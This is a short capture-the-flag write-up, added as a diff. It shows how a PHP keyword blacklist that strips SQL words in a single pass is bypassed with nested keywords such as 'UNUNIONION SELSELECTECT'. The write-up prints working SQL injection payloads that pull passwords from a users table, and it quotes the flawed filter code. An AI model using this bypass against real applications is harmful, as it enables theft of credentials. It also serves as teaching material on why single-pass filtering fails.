@@ -1,0 +1,26 @@
+This is the same application with some additional sanitization. 
+They filter out union, order, select, from, group by, at least that what they claim in the problem definition. 
+Let's start by looking at the new code.
+
+        $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
+        $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);
+
+implode() will concat the elements in the array with | between them
+preg_replace() will do a regex search. More precisely it will search $injection for matches to '/' . $searchWords . '/i' and replace with ''
+
+I will pop in the winning injection from last level to see how it's handled.
+
+Input: 1 UNION SELECT id,password FROM users --
+Result:
+	Unable to prepare statement: 1, near "id": syntax error
+Sure enough it removed all the stuff between 1 and id.
+
+Maybe if I nest the statements I want inside each other I can get the query to go through after the sanitization?
+I mean, it's only doing the preg_replace call once...
+
+Input: 1 UNUNIONION SELSELECTECT id,password FRFROMOM users --
+Result:
+	id -> 1
+	username -> WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
+
+Bingo. Turns out Black lists are often a good idea.
